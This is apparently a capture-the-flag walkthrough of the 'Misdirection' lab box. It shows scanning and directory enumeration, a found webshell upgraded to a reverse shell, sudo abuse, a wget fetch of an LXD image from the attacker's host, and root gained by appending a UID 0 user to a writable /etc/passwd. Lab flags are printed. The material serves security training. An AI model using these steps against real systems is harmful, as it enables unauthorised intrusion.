# Misdirection writeup

LEt's start with a network scan 
```bash
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                
                                                                                                                                                                                                              
 7 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 420                                                                                                                                              
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   40:65:d4:5e:e0:3e      1      60  Unknown vendor                                                                                                                                             
 192.168.0.122   00:0c:29:7c:39:d4      5     300  VMware, Inc.                                                                                                                                               
 192.168.0.1     f0:a7:31:e9:bb:f8      1      60  TP-Link Systems Inc
```
\
Next , Open Ports on this ip
```bash
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
3306/tcp open  mysql      syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
```
\
Accessing port 80 on a web browser , gives us 
\
<img width="1656" height="765" alt="image" src="https://github.com/user-attachments/assets/25eec57c-ccc1-475c-9d52-0d1b032d122b" />
\
Next , started directory enumeration
```bash
ffuf -u http://192.168.0.122:80/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -r 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.122:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 356ms]
# Copyright 2007 James Fisher [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 358ms]
welcome                 [Status: 200, Size: 13705, Words: 3093, Lines: 289, Duration: 392ms]
admin                   [Status: 200, Size: 42, Words: 6, Lines: 1, Duration: 404ms]
#                       [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 760ms]
#                       [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 808ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 825ms]
examples                [Status: 200, Size: 6937, Words: 953, Lines: 134, Duration: 78ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 968ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 971ms]
                        [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 978ms]
# on at least 2 different hosts [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 978ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 1449ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 1444ms]
# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 1476ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 1483ms]
#                       [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 1573ms]
init                    [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 100ms]
                        [Status: 200, Size: 5782, Words: 836, Lines: 114, Duration: 150ms]
```
\
Tried these endpoints but nothing important could be found
\
Next , Visiting on Port 8080, We just see a apache default installation file, Enumerating this http service using ffuf
```bash
ffuf -u http://192.168.0.122:8080/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -r

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.122:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# This work is licensed under the Creative Commons [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 3ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 4ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 6ms]
#                       [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 6ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 6ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 7ms]
# on at least 2 different hosts [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 9ms]
#                       [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 9ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 10ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 13ms]
# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 13ms]
# Copyright 2007 James Fisher [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 16ms]
#                       [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 17ms]
#                       [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 28ms]
images                  [Status: 200, Size: 744, Words: 52, Lines: 16, Duration: 20ms]
help                    [Status: 200, Size: 740, Words: 52, Lines: 16, Duration: 16ms]
scripts                 [Status: 200, Size: 746, Words: 52, Lines: 16, Duration: 15ms]
css                     [Status: 200, Size: 738, Words: 52, Lines: 16, Duration: 20ms]
development             [Status: 200, Size: 754, Words: 52, Lines: 16, Duration: 18ms]
manual                  [Status: 200, Size: 744, Words: 52, Lines: 16, Duration: 18ms]
js                      [Status: 200, Size: 736, Words: 52, Lines: 16, Duration: 22ms]
shell                   [Status: 200, Size: 742, Words: 52, Lines: 16, Duration: 10ms]
debug                   [Status: 200, Size: 12908, Words: 5888, Lines: 354, Duration: 95ms]
```
\
The moment i saw "shell" , i thought we had found an easy way into the box 
\
<img width="722" height="302" alt="image" src="https://github.com/user-attachments/assets/616dd9e4-3c7d-43f7-b83a-df856834444b" />
\
But was disappointed , so i started checking other endpoints, and "/debug" literally had a webshell running on it
\
<img width="1371" height="685" alt="image" src="https://github.com/user-attachments/assets/ca6dcd19-f03d-4d98-8bec-9b3b130565e3" />
\
So i changed to a local shell ( incase there was a time limit / command limit for the webshell to disappear )
```bash
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.105
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from misdirection~192.168.0.122-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/misdirection~192.168.0.122-Linux-x86_64/2026_01_31-00_58_38-011.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@misdirection:/var/www/html/debug$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
\
Next , checking Sudo Capabilities shows us that we have access to bash as user "Brexit"
```bash
sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on localhost:
    (brexit) NOPASSWD: /bin/bash
```
\
So , i use this command to switch to brexit
```bash
sudo -u brexit /bin/bash -i
id   
uid=1000(brexit) gid=1000(brexit) groups=1000(brexit),24(cdrom),30(dip),46(plugdev),108(lxd)
```
\
And , we get the user flag
```bash
cat user.txt 
404b9193154be7fbbc56d7534cb26339
```
\
I see that the user is in lxc group , so i try that priv esc method by following this "https://www.hackingarticles.in/lxd-privilege-escalation/"
```bash
 wget 'http://192.168.0.105:9000/alpine-v3.13-x86_64-20210218_0139.tar.gz'
--2026-01-31 06:14:18--  http://192.168.0.105:9000/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 192.168.0.105:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: 'alpine-v3.13-x86_64-20210218_0139.tar.gz'

alpine-v3.13-x86_64-20210218_0139.tar.gz            100%[==================================================================================================================>]   3.11M  --.-KB/s    in 0.02s   

2026-01-31 06:14:18 (185 MB/s) - 'alpine-v3.13-x86_64-20210218_0139.tar.gz' saved [3259593/3259593]

brexit@misdirection:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
brexit@misdirection:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Jan 31, 2026 at 6:14am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
brexit@misdirection:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
Error: No storage pool found. Please create a new storage pool
```
\
But it said some storage pool error , so i couldnt proceed further 
\
So , next when i run linpeas script for checking anything useful , we find this
```bash

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable                                                                                                                                              
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No                                                                                                                                                                   
═╣ Can I read shadow plists? ............ No                                                                                                                                                                   
═╣ Can I write shadow plists? ........... No                                                                                                                                                                   
═╣ Can I read opasswd file? ............. No                                                                                                                                                                   
═╣ Can I write in network-scripts? ...... No                                                                                                                                                                   
═╣ Can I read root folder? .............. No                                                                                                                                                                   

```
```bash
ls -la /etc/passwd
-rwxrwxr-- 1 root brexit 1617 Jun  1  2019 /etc/passwd
```
\
So , we create a new root user
\
First , we create a passwd in the format used by the system
```bash
mkpasswd -m SHA-512
Password: 
$6$pka0QFGrh8Ba9fIK$dIhIUk/11ZTJr.2kIcuXcpX8VPhv2ZmjNqJqKeSY4OvMAsAm2CbjsqoyHTBWFDOI.QFl5qpQ3YFwjuSP/FsjR/
```
\
Next , to add the user in the /etc/passwd file , we have to follow a syntax , so the best would be to see the root user for help
```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
```
\
Now , we have to make a similar user , except we replace the "x" with our passwd ( since x means , it tells the system to check for password hash in /etc/shadow file ) 
\
<img width="1246" height="587" alt="image" src="https://github.com/user-attachments/assets/952762a8-405e-4d2e-b71c-671d04c07ac1" />
\
```bash
tail /etc/passwd
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
brexit:x:1000:1000:brexit:/home/brexit:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
lo1d:$6$pka0QFGrh8Ba9fIK$dIhIUk/11ZTJr.2kIcuXcpX8VPhv2ZmjNqJqKeSY4OvMAsAm2CbjsqoyHTBWFDOI.QFl5qpQ3YFwjuSP/FsjR/:0:0:lo1d:/root:/bin/bash
```
\
So our user is successfully added , now we just switch to the user , with our password
```bash
su lo1d
Password: 
root@misdirection:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@misdirection:/tmp# cd /root
root@misdirection:~# ls -la
total 60
drwx------  6 root root  4096 Sep 24  2019 .
drwxr-xr-x 23 root root  4096 Jan 31 06:07 ..
-rw-------  1 root root    90 Sep 24  2019 .bash_history
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 Jun  1  2019 .cache
drwx------  3 root root  4096 Jun  1  2019 .gnupg
drwxr-xr-x  3 root root  4096 Jun  1  2019 .local
-rw-------  1 root root   400 Jun  1  2019 .mysql_history
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-r--------  1 root root    33 Jun  1  2019 root.txt
drwx------  2 root root  4096 Jun  1  2019 .ssh
-rw-------  1 root root 11298 Sep 24  2019 .viminfo
-rw-r--r--  1 root root   180 Jun  1  2019 .wget-hsts
root@misdirection:~# cat root.txt 
0d2c6222bfdd3701e0fa12a9a9dc9c8c
```
\
The End , thank you for reading till here
